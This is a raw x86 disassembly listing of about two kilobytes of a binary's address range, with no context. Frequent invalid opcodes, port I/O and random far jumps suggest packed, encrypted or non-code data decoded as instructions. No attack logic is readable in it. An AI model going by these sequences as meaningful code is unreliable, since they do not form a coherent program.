  40b379:	xchg   DWORD PTR [edi-0x1b2fd8d],esi
  40b37f:	aad    0x4c
  40b381:	data16 mov ds:0x602d94a0,al
  40b387:	pusha  
  40b388:	fwait
  40b389:	xlat   BYTE PTR ds:[ebx]
  40b38a:	test   BYTE PTR [ebx],bl
  40b38c:	pushf  
  40b38d:	and    al,0x37
  40b38f:	dec    ecx
  40b390:	sbb    al,0x1d
  40b392:	lahf   
  40b393:	xor    al,0x78
  40b395:	pop    ebx
  40b396:	push   edx
  40b397:	ret    0x7ab6
  40b39a:	(bad)  
  40b39b:	in     al,0xb0
  40b39d:	mov    al,ds:0x55847163
  40b3a2:	mov    esp,0xe814fffc
  40b3a7:	adc    eax,0x135c25a6
  40b3ac:	xor    ch,ch
  40b3ae:	rep outs dx,DWORD PTR ds:[esi]
  40b3b0:	sub    BYTE PTR [esi+0xe4b73bf],dh
  40b3b6:	and    BYTE PTR [edx+esi*2+0x22],cl
  40b3ba:	aad    0x10
  40b3bc:	fwait
  40b3bd:	adc    ebp,DWORD PTR [edx+0x33]
  40b3c0:	and    esi,eax
  40b3c2:	jp     0x40b3fc
  40b3c4:	push   esp
  40b3c5:	js     0x40b3a0
  40b3c7:	pop    ds
  40b3c8:	sbb    ah,BYTE PTR [edx+0x1fd3d96a]
  40b3ce:	push   cs
  40b3cf:	mov    esi,0x9e2890cb
  40b3d4:	cmc    
  40b3d5:	shr    DWORD PTR [ecx],cl
  40b3d7:	fsub   QWORD PTR [esi-0x6dc92728]
  40b3dd:	rcl    ecx,1
  40b3df:	jns    0x40b43a
  40b3e1:	xchg   esp,eax
  40b3e2:	test   eax,0x78574a10
  40b3e7:	jbe    0x40b3fc
  40b3e9:	in     al,dx
  40b3ea:	loop   0x40b37b
  40b3ec:	sub    BYTE PTR [ebp-0x7745b2b2],0xff
  40b3f3:	jp     0x40b3a5
  40b3f5:	imul   ecx,DWORD PTR [esi+ebp*2+0x51],0xffffff98
  40b3fa:	rcr    DWORD PTR ds:0x5e139f9a,1
  40b400:	mov    ah,al
  40b402:	scas   al,BYTE PTR es:[edi]
  40b403:	jle    0x40b38b
  40b405:	out    0xb9,al
  40b407:	ficom  DWORD PTR [ebx+esi*8]
  40b40a:	push   DWORD PTR [edi]
  40b40c:	mov    bh,BYTE PTR ds:0x634ce527
  40b412:	(bad)  
  40b413:	pop    ss
  40b414:	mov    eax,ds:0xd389ef
  40b419:	stos   DWORD PTR es:[edi],eax
  40b41a:	imul   edi,esp,0x2b
  40b41d:	jge    0x40b3fb
  40b41f:	sub    ebx,DWORD PTR [ecx]
  40b421:	mov    esi,0xf636f3fe
  40b426:	ja     0x40b3e0
  40b428:	das    
  40b429:	stos   DWORD PTR es:[edi],eax
  40b42a:	fisubr DWORD PTR [ecx]
  40b42c:	adc    edx,DWORD PTR [edi+edi*8+0x47657908]
  40b433:	aaa    
  40b434:	ret    
  40b435:	mov    ebp,0xbf860049
  40b43a:	mov    cl,0x62
  40b43c:	not    al
  40b43e:	jae    0x40b47a
  40b440:	mov    dl,0x4d
  40b442:	xor    bl,cl
  40b444:	cwde   
  40b445:	push   ecx
  40b446:	ins    BYTE PTR es:[edi],dx
  40b447:	imul   esp,DWORD PTR [edi],0x58
  40b44a:	jg     0x40b457
  40b44c:	in     eax,0xca
  40b44e:	test   eax,0x251e6516
  40b453:	add    BYTE PTR [ebp+0x71c05128],dl
  40b459:	retf   0x1a6f
  40b45c:	push   ebp
  40b45d:	dec    ebx
  40b45e:	mov    al,0xcd
  40b460:	nop
  40b461:	pop    ebx
  40b462:	pop    eax
  40b463:	mov    esi,0x66ae51d7
  40b468:	sub    eax,edi
  40b46a:	xchg   ecx,eax
  40b46b:	(bad)  
  40b46c:	mov    DWORD PTR [ebx+eax*8],esp
  40b46f:	pop    ebp
  40b470:	mov    al,ds:0x70c17ae2
  40b475:	xor    eax,0x8a05ff63
  40b47a:	dec    esi
  40b47b:	loop   0x40b411
  40b47d:	jmp    0x14d2:0xa6168dc6
  40b484:	fimul  WORD PTR [edx-0x74]
  40b487:	sub    al,0xf2
  40b489:	xor    DWORD PTR [edx],esi
  40b48b:	repnz loope 0x40b459
  40b48e:	mov    cl,0x8b
  40b490:	xchg   ecx,eax
  40b491:	cdq    
  40b492:	mov    al,ds:0xa137e9c0
  40b497:	sbb    eax,0x939f1769
  40b49c:	frstor [edx]
  40b49e:	imul   ecx,DWORD PTR [esi+0x42],0x15f80ed4
  40b4a5:	test   DWORD PTR [eax+esi*4+0x38],esp
  40b4a9:	test   eax,0xecf99ed
  40b4ae:	and    cl,bl
  40b4b0:	and    ah,bl
  40b4b2:	mov    ch,0x61
  40b4b4:	jmp    0xdaa2:0xf439ad3d
  40b4bb:	push   ecx
  40b4bc:	adc    DWORD PTR [edi],ecx
  40b4be:	in     eax,0xc8
  40b4c0:	mov    ds:0x3ba38bdd,al
  40b4c5:	and    bl,0x52
  40b4c8:	jp     0x40b4f5
  40b4ca:	mov    ds:0xd0ce985c,al
  40b4cf:	jnp    0x40b47a
  40b4d1:	outs   dx,DWORD PTR ds:[esi]
  40b4d2:	imul   edi,DWORD PTR [esi-0x4ede888],0x368fba20
  40b4dc:	test   eax,0x39fb1e90
  40b4e1:	mov    ds:0x76efd625,eax
  40b4e6:	mul    DWORD PTR ds:0x4363db23
  40b4ec:	lock es fwait
  40b4ef:	adc    al,0x63
  40b4f1:	call   0x4695259f
  40b4f6:	stc    
  40b4f7:	fstp   DWORD PTR [edx+0x1]
  40b4fa:	jle    0x40b502
  40b4fc:	push   0x13cee504
  40b501:	cld    
  40b502:	xor    DWORD PTR [ecx],0xffffffa0
  40b505:	xchg   BYTE PTR [esi+0x71],dh
  40b508:	pop    edx
  40b509:	and    DWORD PTR [esp+ecx*8],ebx
  40b50c:	inc    esp
  40b50d:	jo     0x40b586
  40b50f:	push   0x74
  40b511:	out    0x14,eax
  40b513:	scas   al,BYTE PTR es:[edi]
  40b514:	adc    eax,0x3748ebd7
  40b519:	mov    bl,bl
  40b51b:	xor    al,0x99
  40b51d:	xor    edx,DWORD PTR [eax+ebp*4]
  40b520:	cmp    dh,BYTE PTR [edi-0x46]
  40b523:	aam    0x96
  40b525:	inc    esi
  40b526:	push   ebp
  40b527:	jecxz  0x40b520
  40b529:	stc    
  40b52a:	retf   0x571e
  40b52d:	stc    
  40b52e:	mov    ebx,0x2f183baa
  40b533:	sbb    eax,0x8b9940f
  40b538:	cs loop 0x40b51c
  40b53b:	jmp    0x19bf:0xf1f859b0
  40b542:	mov    ebp,0xe01f0dce
  40b547:	aam    0xd4
  40b549:	mov    dh,0xd6
  40b54b:	mov    edx,0xa3dce7bc
  40b550:	jnp    0x40b4f5
  40b552:	ins    DWORD PTR es:[edi],dx
  40b553:	int    0x19
  40b555:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b556:	jp     0x40b5a7
  40b558:	mov    al,0x21
  40b55a:	leave  
  40b55b:	dec    esp
  40b55c:	dec    esi
  40b55d:	ins    DWORD PTR es:[edi],dx
  40b55e:	in     eax,dx
  40b55f:	test   al,0x1b
  40b561:	leave  
  40b562:	dec    ebp
  40b563:	sbb    eax,0xdcda9274
  40b568:	jmp    0x524883e6
  40b56d:	dec    esp
  40b56e:	push   esi
  40b56f:	mov    esi,0x76f57968
  40b574:	add    al,0xaf
  40b576:	addr16 mov ebp,0xc90ea55e
  40b57c:	callw  0xf2f7
  40b580:	pop    esi
  40b581:	adc    eax,0x6a3c50ca
  40b586:	xor    eax,0x59002eea
  40b58b:	mov    dh,0xaa
  40b58d:	imul   eax,edx,0x40
  40b590:	and    al,0x87
  40b592:	jae    0x40b5c9
  40b594:	lahf   
  40b595:	pop    ds
  40b596:	mov    al,ds:0x95313233
  40b59b:	into   
  40b59c:	imul   esp,DWORD PTR [eax],0x6c845e64
  40b5a2:	aas    
  40b5a3:	push   0x67dd87db
  40b5a8:	or     edx,eax
  40b5aa:	shr    BYTE PTR [edx+0x4d],1
  40b5ad:	jae    0x40b539
  40b5af:	(bad)  
  40b5b0:	adc    eax,0x62f872f2
  40b5b5:	pop    ebp
  40b5b6:	test   DWORD PTR [esi+ebx*8-0x133a0a21],ebx
  40b5bd:	jge    0x40b60c
  40b5bf:	mov    ds:0xd465e649,al
  40b5c4:	mov    eax,0xd71d3be3
  40b5c9:	mov    eax,ds:0x193402d4
  40b5ce:	jge    0x40b559
  40b5d0:	push   edx
  40b5d1:	loopne 0x40b5c7
  40b5d3:	montmul (bad)
  40b5d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5d5:	add    ebx,edi
  40b5d7:	es sti 
  40b5d9:	clc    
  40b5da:	adc    bl,BYTE PTR ds:0xc9215074
  40b5e0:	test   eax,0xcfb7ec8f
  40b5e5:	and    al,0x4a
  40b5e7:	loop   0x40b5d4
  40b5e9:	inc    esi
  40b5ea:	mov    ch,0x9f
  40b5ec:	mov    ds:0x7482719f,al
  40b5f1:	mov    cl,0x78
  40b5f3:	hlt    
  40b5f4:	loopne 0x40b5c0
  40b5f6:	or     ebp,DWORD PTR [ecx-0x35ebffd3]
  40b5fc:	xchg   ebx,eax
  40b5fd:	lock adc al,0x8d
  40b600:	aas    
  40b601:	mov    bh,0xc4
  40b603:	daa    
  40b604:	inc    esp
  40b605:	and    edi,0xffffffca
  40b608:	rcl    ah,1
  40b60a:	aaa    
  40b60b:	pushf  
  40b60c:	jne    0x40b5cc
  40b60e:	dec    ebx
  40b60f:	sub    eax,0xf04b873e
  40b614:	mov    eax,0x57cc3473
  40b619:	lahf   
  40b61a:	pop    ebx
  40b61b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b61c:	aas    
  40b61d:	and    BYTE PTR [ebx],bh
  40b61f:	pop    ecx
  40b620:	push   eax
  40b621:	mov    ecx,0xb449c621
  40b626:	sub    al,0x44
  40b628:	pop    esp
  40b629:	fnstsw WORD PTR [esi]
  40b62b:	loopne 0x40b627
  40b62d:	and    DWORD PTR [esi+0x32],esi
  40b630:	push   esp
  40b631:	xchg   ecx,eax
  40b632:	jmp    0xc50f:0x757b9559
  40b639:	mov    ecx,0xe97ee0ea
  40b63e:	je     0x40b623
  40b640:	cmp    BYTE PTR [edi],dh
  40b642:	daa    
  40b643:	pop    ebp
  40b644:	dec    ecx
  40b645:	push   ds
  40b646:	ja     0x40b60c
  40b648:	pop    ds
  40b649:	push   esp
  40b64a:	add    esp,DWORD PTR [eax]
  40b64c:	mov    bl,0x4f
  40b64e:	stos   BYTE PTR es:[edi],al
  40b64f:	adc    BYTE PTR [ecx-0x66],bl
  40b652:	jle    0x40b63f
  40b654:	lock arpl WORD PTR [esi+0x6f],dx
  40b658:	es xor eax,0xef2699b7
  40b65e:	lea    edx,[ebx-0x43]
  40b661:	(bad)  
  40b664:	cmp    eax,DWORD PTR [ebx-0x519c2e82]
  40b66a:	mov    esp,0xb7db6deb
  40b66f:	test   eax,0x3f363bb5
  40b674:	pop    esp
  40b675:	rol    DWORD PTR [ebx-0x5822776f],cl
  40b67b:	or     DWORD PTR [edx+0x34],ecx
  40b67e:	jmp    0x40b680
  40b680:	(bad)  
  40b682:	mov    esp,0x71b1a34e
  40b687:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b688:	call   0x8c67a2b5
  40b68d:	xchg   ebx,eax
  40b68e:	push   0xffffffa2
  40b690:	fidiv  DWORD PTR ds:0x294be3b4
  40b696:	sbb    dh,BYTE PTR [ebx-0x5cac4410]
  40b69c:	loopne 0x40b706
  40b69e:	xchg   BYTE PTR [eax],ah
  40b6a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6a1:	add    bh,ah
  40b6a3:	outs   dx,BYTE PTR ds:[esi]
  40b6a4:	inc    ecx
  40b6a5:	les    edx,FWORD PTR [ebx]
  40b6a7:	inc    edx
  40b6a8:	shr    BYTE PTR [esi+0x34da86e7],cl
  40b6ae:	psraw  mm6,QWORD PTR [esi+0x4e467782]
  40b6b5:	inc    edi
  40b6b6:	cdq    
  40b6b7:	xor    al,0x56
  40b6b9:	mov    ecx,0xe503d534
  40b6be:	mov    al,ds:0x20cc765b
  40b6c3:	shr    bl,0x2a
  40b6c6:	or     eax,0xf2a2c62c
  40b6cb:	mov    dh,0x6a
  40b6cd:	adc    ebp,esi
  40b6cf:	(bad)  
  40b6d0:	and    BYTE PTR [edx-0x2d2d9885],bl
  40b6d6:	cld    
  40b6d7:	sahf   
  40b6d8:	scas   eax,DWORD PTR es:[edi]
  40b6d9:	fwait
  40b6da:	ss loopne 0x40b6ca
  40b6dd:	mov    ecx,0xc354051d
  40b6e2:	mov    BYTE PTR [eax+0x72],bl
  40b6e5:	xlat   BYTE PTR ds:[ebx]
  40b6e6:	repnz daa 
  40b6e8:	cmp    DWORD PTR [esp+eax*2+0x7314adf9],0x498aebd9
  40b6f3:	nop
  40b6f4:	call   0x47837a4c
  40b6f9:	cdq    
  40b6fa:	ja     0x40b77b
  40b6fc:	mov    esp,0x6f8a1ed
  40b701:	pop    ds
  40b702:	sar    DWORD PTR [esi],cl
  40b704:	(bad)  
  40b705:	(bad)  [esi]
  40b707:	loope  0x40b705
  40b709:	adc    ebp,edi
  40b70b:	sti    
  40b70c:	sub    DWORD PTR [ebp+ecx*8-0x4001431e],ebx
  40b713:	ror    BYTE PTR [esi+0x4d],1
  40b716:	lahf   
  40b717:	xchg   ebx,eax
  40b718:	sysenter 
  40b71a:	retf   0x21c6
  40b71d:	(bad)  [eax]
  40b71f:	pop    esi
  40b720:	(bad)  
  40b721:	sbb    eax,0xc7df1968
  40b726:	mov    ah,0xf8
  40b728:	sub    dl,BYTE PTR [ebx]
  40b72a:	cmp    DWORD PTR [edx+0x41],ebx
  40b72d:	mov    WORD PTR [edx+0x20],es
  40b730:	in     eax,dx
  40b731:	call   0xb9fa:0xc8f3e5f4
  40b738:	jl     0x40b6ee
  40b73a:	jmp    0xe0e7:0x146ebeb5
  40b741:	in     al,0x81
  40b743:	fldcw  WORD PTR [ecx+0x34]
  40b746:	fwait
  40b747:	loope  0x40b736
  40b749:	repnz cld 
  40b74b:	int3   
  40b74c:	lahf   
  40b74d:	hlt    
  40b74e:	add    eax,0xb314bce9
  40b753:	loop   0x40b7bb
  40b755:	jbe    0x40b779
  40b757:	sub    al,0x7e
  40b759:	cmp    al,BYTE PTR [ecx-0x19824ce6]
  40b75f:	jb     0x40b70a
  40b761:	mov    esi,0x465cd73a
  40b766:	add    BYTE PTR [esi],bl
  40b768:	dec    ebp
  40b769:	and    ecx,edx
  40b76b:	loope  0x40b725
  40b76d:	xor    al,0xe0
  40b76f:	adc    al,0x1
  40b771:	dec    esp
  40b772:	sti    
  40b773:	inc    edx
  40b774:	jns    0x40b773
  40b776:	xor    BYTE PTR [eax+0x67],ah
  40b779:	adc    DWORD PTR [eax-0x27d78f15],ecx
  40b77f:	add    ebp,DWORD PTR [esi+0x50ebf86c]
  40b785:	xor    al,0x70
  40b787:	push   edi
  40b788:	sar    edi,cl
  40b78a:	cdq    
  40b78b:	addr16 xchg ebp,eax
  40b78d:	nop
  40b78e:	out    0xf,al
  40b790:	push   ebx
  40b791:	sbb    eax,0x1d3d8709
  40b796:	(bad)  
  40b797:	in     al,dx
  40b798:	sbb    al,0xb
  40b79a:	scas   al,BYTE PTR es:[edi]
  40b79b:	cmp    ebp,DWORD PTR [ebx+0x6b]
  40b79e:	mov    eax,0xe73b955a
  40b7a3:	mov    ch,0xbb
  40b7a5:	or     esi,DWORD PTR [eax]
  40b7a7:	mov    eax,0xf415fde6
  40b7ac:	stos   DWORD PTR es:[edi],eax
  40b7ad:	xchg   ecx,eax
  40b7ae:	popf   
  40b7af:	mov    al,ds:0x32a8d70f
  40b7b4:	mov    esi,0x335588b
  40b7b9:	les    edx,FWORD PTR [eax+0x1f]
  40b7bc:	or     bl,BYTE PTR [ecx+0x54214235]
  40b7c2:	jp     0x40b7ee
  40b7c4:	pop    edi
  40b7c5:	sub    DWORD PTR [edx+eax*8],esi
  40b7c8:	mov    es,WORD PTR [edx-0x4c8d233d]
  40b7ce:	inc    ebx
  40b7cf:	fwait
  40b7d0:	cmp    esi,DWORD PTR [eax-0x3b779aac]
  40b7d6:	fist   DWORD PTR [edx+0x2]
  40b7d9:	pop    ds
  40b7da:	test   DWORD PTR [ebp+0x62],0x87873b73
  40b7e1:	fimul  WORD PTR [esi+0x14]
  40b7e4:	ins    DWORD PTR es:[edi],dx
  40b7e5:	or     ah,BYTE PTR [ecx+0x8]
  40b7e8:	push   esi
  40b7e9:	or     esp,DWORD PTR ds:0x349a6ee4
  40b7ef:	adc    DWORD PTR [edx-0x72],0xfb9a146e
  40b7f6:	mov    edi,ebx
  40b7f8:	ja     0x40b7a9
  40b7fa:	imul   ecx,DWORD PTR ds:0x58b6da47,0x5c
  40b801:	and    al,0xaa
  40b803:	xchg   ebx,eax
  40b804:	sbb    esi,DWORD PTR [ebp-0x5419b120]
  40b80a:	add    DWORD PTR [esi+0x1f],edi
  40b80d:	xlat   BYTE PTR ds:[ebx]
  40b80e:	in     eax,0xc
  40b810:	leave  
  40b811:	pop    ss
  40b812:	xchg   esi,eax
  40b813:	test   al,0x51
  40b815:	mov    ds:0x7163e79b,al
  40b81a:	mov    ecx,0x9ba8a3d3
  40b81f:	je     0x40b80a
  40b821:	int    0x13
  40b823:	sbb    BYTE PTR [edx+0x359c8d28],cl
  40b829:	mov    db2,edi
  40b82c:	or     dh,bh
  40b82e:	ins    DWORD PTR es:[edi],dx
  40b82f:	inc    ebx
  40b830:	or     eax,0xe53d19da
  40b835:	push   0xffffffc8
  40b837:	addr16 pop ebx
  40b839:	daa    
  40b83a:	and    bl,cl
  40b83c:	cs xchg ecx,eax
  40b83e:	xchg   esp,eax
  40b83f:	mov    edx,0x36af60c6
  40b844:	mov    ebp,0x4411211a
  40b849:	mov    ds:0xec7cd934,al
  40b84e:	dec    eax
  40b84f:	push   0x2f
  40b851:	ins    BYTE PTR es:[edi],dx
  40b852:	xor    ebx,DWORD PTR [edi+0x6d]
  40b855:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b856:	inc    ebx
  40b857:	jmp    0x802f:0xdc84ed18
  40b85e:	mov    dl,BYTE PTR [edx+0x6d]
  40b861:	push   edi
  40b862:	xor    DWORD PTR [esp+eiz*4],0x6c97957a
  40b869:	jb     0x40b857
  40b86b:	imul   ebp,esp,0x33
  40b86e:	(bad)  
  40b86f:	imul   bh
  40b871:	add    eax,edi
  40b873:	in     eax,0x7b
  40b875:	data16 stc 
  40b877:	or     BYTE PTR [eax+0x3d],bh
  40b87a:	pop    ebp
  40b87b:	(bad)  
  40b87c:	vpmaxsw xmm6,xmm6,XMMWORD PTR [edx+0x11]
  40b881:	cli    
  40b882:	sbb    al,0xaa
  40b884:	popf   
  40b885:	mov    esp,0x4d5acfe
  40b88a:	into   
  40b88b:	fisub  WORD PTR [ebp+ebp*4-0xc]
  40b88f:	xor    al,0xa8
  40b891:	call   esp
  40b893:	mov    DWORD PTR [edx-0x6f],edx
  40b896:	or     edi,DWORD PTR [edi]
  40b898:	nop
  40b899:	inc    edx
  40b89a:	aaa    
  40b89b:	int3   
  40b89c:	adc    al,0x94
  40b89e:	xchg   esi,eax
  40b89f:	dec    esi
  40b8a0:	and    eax,DWORD PTR [eax-0x1c13ff97]
  40b8a6:	dec    ebx
  40b8a7:	repz push ds
  40b8a9:	pop    ss
  40b8aa:	shr    DWORD PTR [edx+0x53],0x2e
  40b8ae:	pop    ds
  40b8af:	aas    
  40b8b0:	cmp    esi,0x5e
  40b8b3:	dec    ecx
  40b8b4:	pop    ebx
  40b8b5:	inc    esp
  40b8b6:	jae    0x40b902
  40b8b8:	jmp    0x40b927
  40b8ba:	push   ds
  40b8bb:	lea    esp,[ebp-0x289e6ce9]
  40b8c1:	enter  0x7e4d,0x6d
  40b8c5:	pop    esi
  40b8c6:	xchg   esi,eax
  40b8c7:	jbe    0x40b8fe
  40b8c9:	mov    ebp,0x51425458
  40b8ce:	popf   
  40b8cf:	mov    bl,0x34
  40b8d1:	(bad)  [ebx+0x2bfa122b]
  40b8d7:	test   DWORD PTR [esi-0x76784a14],edi
  40b8dd:	test   BYTE PTR [edi+ebx*1],ah
  40b8e0:	adc    dh,dh
  40b8e2:	(bad)  
  40b8e3:	mov    edi,es
  40b8e5:	push   edi
  40b8e6:	ds mov ecx,0xc6515d13
  40b8ec:	popf   
  40b8ed:	call   0x4e6a:0x3bc8c07
  40b8f4:	push   0x1b
  40b8f6:	sahf   
  40b8f7:	or     DWORD PTR [ebx],edi
  40b8f9:	mov    edx,0x5277f530
  40b8fe:	in     eax,0xf5
  40b900:	pop    ebp
  40b901:	inc    ecx
  40b902:	mov    eax,?
  40b904:	pop    ss
  40b905:	dec    eax
  40b906:	xor    eax,0x907d3a03
  40b90b:	inc    ecx
  40b90c:	inc    esi
  40b90d:	mov    ebx,DWORD PTR [eax+edx*4]
  40b910:	add    eax,0x9ab38755
  40b915:	(bad)  
  40b916:	jge    0x40b95e
  40b918:	and    eax,0x48aa8aff
  40b91d:	fcom   DWORD PTR [edx-0x6]
  40b920:	rcr    esp,cl
  40b922:	pop    ds
  40b923:	popf   
  40b924:	and    DWORD PTR [edx],esi
  40b926:	mov    al,ds:0x9d006e82
  40b92b:	ins    BYTE PTR es:[edi],dx
  40b92c:	ret    
  40b92d:	mov    ecx,0x897a1714
  40b932:	xor    eax,0xd7c220a8
  40b937:	inc    esi
  40b938:	dec    esi
  40b939:	sbb    BYTE PTR [ebp+0x31],0xfb
  40b93d:	leave  
  40b93e:	mov    al,ds:0x60b41aff
  40b943:	inc    eax
  40b944:	jb     0x40b925
  40b946:	xlat   BYTE PTR ds:[ebx]
  40b947:	push   eax
  40b948:	sbb    BYTE PTR [edx+0x3ae48fce],ah
  40b94e:	mov    ah,0xba
  40b950:	aad    0x77
  40b952:	pushf  
  40b953:	ds sub al,0xac
  40b956:	sar    DWORD PTR [eax-0x1a],1
  40b959:	or     DWORD PTR [edx],ebx
  40b95b:	and    BYTE PTR [edx],bh
  40b95d:	pop    esi
  40b95e:	cmc    
  40b95f:	(bad)  [ecx+0x7b]
  40b962:	cs cdq 
  40b964:	test   al,0x40
  40b966:	int    0xed
  40b968:	jno    0x40b969
  40b96a:	inc    ebp
  40b96b:	jmp    0x46cf:0xa0da008d
  40b972:	pop    esp
  40b973:	sub    eax,DWORD PTR [ebp+0x69ce48db]
  40b979:	inc    ecx
  40b97a:	test   ecx,esi
  40b97c:	cli    
  40b97d:	mov    ebp,0x7526d279
  40b982:	xor    eax,0xe2c831b1
  40b987:	pop    ebx
  40b988:	dec    eax
  40b989:	sub    eax,DWORD PTR [ebx+ecx*8]
  40b98c:	retf   0x37d
  40b98f:	push   cs
  40b990:	dec    ecx
  40b991:	dec    edi
  40b992:	sbb    dl,dl
  40b994:	in     eax,0x3
  40b996:	jbe    0x40b9ec
  40b998:	add    al,0x21
  40b99a:	xchg   edi,eax
  40b99b:	dec    ebx
  40b99c:	mov    ch,al
  40b99e:	in     al,dx
  40b99f:	add    eax,0xf9c151e4
  40b9a4:	jg     0x40b9fc
  40b9a6:	mov    ebx,DWORD PTR [ecx-0x28122f3c]
  40b9ac:	sub    ecx,edi
  40b9ae:	pushf  
  40b9af:	dec    BYTE PTR [edx+0x58c7dc85]
  40b9b5:	bound  ebp,QWORD PTR [ecx]
  40b9b7:	push   ds
  40b9b8:	arpl   ax,si
  40b9ba:	jl     0x40b9a8
  40b9bc:	add    ebx,edi
  40b9be:	xor    al,BYTE PTR [ebp+0x3a136eb7]
  40b9c4:	(bad)  
  40b9c5:	mov    ds:0xbc260720,al
  40b9ca:	push   esi
  40b9cb:	leave  
  40b9cc:	addr16 adc esi,esp
  40b9cf:	mov    ch,al
  40b9d1:	mov    dh,0xaf
  40b9d3:	dec    ecx
  40b9d4:	fbld   TBYTE PTR [edx]
  40b9d6:	pop    edi
  40b9d7:	mov    edx,0xbe12a76c
  40b9dc:	mov    ch,0x71
  40b9de:	sub    eax,DWORD PTR [ebx]
  40b9e0:	sar    BYTE PTR [edx],0x2f
  40b9e3:	fcomp  QWORD PTR [esp+edx*1-0x5d]
  40b9e7:	call   0xf406:0x5b113767
  40b9ee:	or     edi,ecx
  40b9f0:	mov    ds:0xad733731,eax
  40b9f5:	scas   eax,DWORD PTR es:[edi]
  40b9f6:	fidivr WORD PTR [eax-0x42e609b8]
  40b9fc:	adc    ch,al
  40b9fe:	retf   0x8db1
  40ba01:	mov    ebp,DWORD PTR [ebx+0x4ff36625]
  40ba07:	retf   0xba35
  40ba0a:	mov    bh,0x7f
  40ba0c:	cmp    al,0x8f
  40ba0e:	and    eax,0x167c5fd0
  40ba13:	or     ecx,0xffffffd9
  40ba16:	cld    
  40ba17:	adc    al,0x8a
  40ba19:	xor    dl,BYTE PTR [ecx]
  40ba1b:	cmp    al,0x6
  40ba1d:	cs aaa 
  40ba1f:	add    bh,cl
  40ba21:	fnstcw WORD PTR [esp+ebp*1-0x2e]
  40ba25:	fsub   st(0),st
  40ba27:	sub    DWORD PTR [edi-0x9d18376],0x21f995e
  40ba31:	leave  
  40ba32:	neg    DWORD PTR [edx+0x80241e0]
  40ba38:	jne    0x40b9ec
  40ba3a:	setns  bh
  40ba3d:	and    DWORD PTR [esi-0x26c4a6c9],edi
  40ba43:	call   0xddbc:0x2a4a29ee
  40ba4a:	cmp    DWORD PTR ds:0xc1f71b1f,0x126dfef
  40ba54:	push   ds
  40ba55:	jbe    0x40baa9
  40ba57:	add    cl,al
  40ba59:	push   edi
  40ba5a:	inc    eax
  40ba5b:	loopne 0x40bac7
  40ba5d:	add    DWORD PTR [ebx-0x5316cc28],ecx
  40ba63:	mov    esp,0x321f7875
  40ba68:	pop    edx
  40ba69:	xor    eax,0x2ebf5fcd
  40ba6e:	aaa    
  40ba6f:	std    
  40ba70:	push   ecx
  40ba71:	jecxz  0x40bac3
  40ba73:	mov    bh,0x59
  40ba75:	std    
  40ba76:	mov    BYTE PTR [edi-0x7a4f8ed4],dh
  40ba7c:	sbb    DWORD PTR [ebx-0x26bb7f67],esp
  40ba82:	xchg   ebx,eax
  40ba83:	aad    0xb4
  40ba85:	jns    0x40ba3d
  40ba87:	loope  0x40ba2c
  40ba89:	js     0x40bae9
  40ba8b:	iret   
  40ba8c:	sub    DWORD PTR [edi+0x2625508f],edi
  40ba92:	mov    ecx,DWORD PTR [ebx]
  40ba94:	jg     0x40bab9
  40ba96:	aad    0xa6
  40ba98:	sub    al,0x70
  40ba9a:	inc    esi
  40ba9b:	das    
  40ba9c:	add    cl,BYTE PTR [ebp+0x63]
  40ba9f:	add    eax,0x13bdbd9c
  40baa4:	std    
  40baa5:	(bad)  
  40baa6:	hlt    
  40baa7:	ins    DWORD PTR es:[edi],dx
  40baa8:	ret    
  40baa9:	fstp   st(3)
  40baab:	rol    DWORD PTR [ecx-0x25ab200a],0x43
  40bab2:	push   ebx
  40bab3:	inc    ecx
  40bab4:	mul    BYTE PTR [ebp-0x17]
  40bab7:	(bad)  
  40bab8:	fisttp WORD PTR [edi+0x31]
  40babb:	jg     0x40baa0
  40babd:	in     al,0x2
  40babf:	nop
  40bac0:	push   cs
  40bac1:	clc    
  40bac2:	adc    al,0x58
  40bac4:	paddd  mm2,QWORD PTR [ebx-0x31]
  40bac8:	lods   eax,DWORD PTR fs:[esi]
  40baca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bacb:	aad    0xc3
  40bacd:	fist   WORD PTR [edx]
  40bacf:	sub    bl,BYTE PTR [ebp+0x5d]
  40bad2:	inc    esi
  40bad3:	aaa    
  40bad4:	pop    ebp
  40bad5:	adc    ecx,eax
  40bad7:	add    cl,bh
  40bad9:	hlt    
  40bada:	lock int 0x0
  40badd:	xchg   ebp,eax
  40bade:	xchg   esi,eax
  40badf:	popa   
  40bae0:	leave  
  40bae1:	push   ecx
  40bae2:	adc    BYTE PTR [edx],0xa0
  40bae5:	in     al,0x2
  40bae7:	aaa    
  40bae8:	xor    eax,0x4ce185ae
  40baed:	ud1    esi,ecx
  40baf0:	stos   DWORD PTR es:[edi],eax
  40baf1:	int3   
  40baf2:	test   DWORD PTR [esi+0x3],0x8d558efc
  40baf9:	das    
  40bafa:	mov    dl,0x3c
  40bafc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bafd:	or     al,0x9
  40baff:	cs pop esp
  40bb01:	adc    bl,0xcc
  40bb04:	sbb    ebx,DWORD PTR [eax]
  40bb06:	xor    DWORD PTR [ebp+0x6f748315],0xffffff83
  40bb0d:	jb     0x40bb35
  40bb0f:	inc    DWORD PTR [ecx-0x11c94be7]
  40bb15:	inc    eax
  40bb16:	pop    ss
  40bb17:	adc    eax,0xaf9002f
  40bb1c:	xor    edi,DWORD PTR [esi]
  40bb1e:	div    BYTE PTR ds:0x121b5a8c
  40bb24:	retf   0x7b65
  40bb27:	dec    ecx
  40bb28:	das    
  40bb29:	icebp  
  40bb2a:	mov    ds:0xf1ddfb26,eax
  40bb2f:	in     eax,0x5f
  40bb31:	cmp    BYTE PTR [esi],dl
  40bb33:	inc    ebx
  40bb34:	hlt    
  40bb35:	inc    edx
  40bb36:	sub    cl,ch
  40bb38:	fimul  DWORD PTR [edi+0x7b]
  40bb3b:	cmp    edi,eax
  40bb3d:	setne  BYTE PTR [ecx-0x14fa14ab]
  40bb44:	xchg   edi,eax
  40bb45:	mul    DWORD PTR [ebp+0x222957c3]
  40bb4b:	stc    
  40bb4c:	(bad)  
  40bb4d:	aad    0x94
  40bb4f:	(bad)  [edx-0x2029651e]
  40bb55:	in     eax,0xf6
  40bb57:	sub    al,0x8f
